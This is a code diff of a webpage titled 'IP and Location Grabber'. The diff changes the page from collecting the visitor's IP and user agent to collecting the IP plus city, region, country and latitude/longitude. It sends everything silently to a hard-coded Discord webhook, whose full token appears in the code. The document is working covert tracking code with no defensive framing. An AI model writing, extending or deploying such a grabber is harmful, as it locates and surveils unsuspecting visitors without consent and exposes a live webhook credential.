@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>IP and Cord Grabber</title>
+    <title>IP and Location Grabber</title>
     <script>
         function sendData() {
             const webhookUrl = 'https://discord.com/api/webhooks/1408171424136302612/n6QRA4_p0gZdLNtfqTG8v6csp0simByjXyMXimc5PWRykziMTScS9HBYH5AxU8dDiA1m'; // Replace with your webhook URL
@@ -12,28 +12,38 @@
                 .then(data => {
                     const userIP = data.ip;
 
-                    // Get user's device information
-                    const userAgent = navigator.userAgent;
-                    const deviceInfo = {
-                        ip: userIP,
-                        userAgent: userAgent
-                    };
+                    // Get user's location data
+                    fetch(`https://ipapi.co/${userIP}/json/`)
+                        .then(response => response.json())
+                        .then(locationData => {
+                            const userLocation = {
+                                ip: userIP,
+                                city: locationData.city,
+                                region: locationData.region,
+                                country: locationData.country_name,
+                                latitude: locationData.latitude,
+                                longitude: locationData.longitude
+                            };
 
-                    // Send data to webhook
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(deviceInfo)
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log('Data sent successfully:', data);
-                    })
-                    .catch(error => {
-                        console.error('Error sending data:', error);
-                    });
+                            // Send data to webhook
+                            fetch(webhookUrl, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify(userLocation)
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                console.log('Data sent successfully:', data);
+                            })
+                            .catch(error => {
+                                console.error('Error sending data:', error);
+                            });
+                        })
+                        .catch(error => {
+                            console.error('Error fetching location data:', error);
+                        });
                 })
                 .catch(error => {
                     console.error('Error fetching IP address:', error);
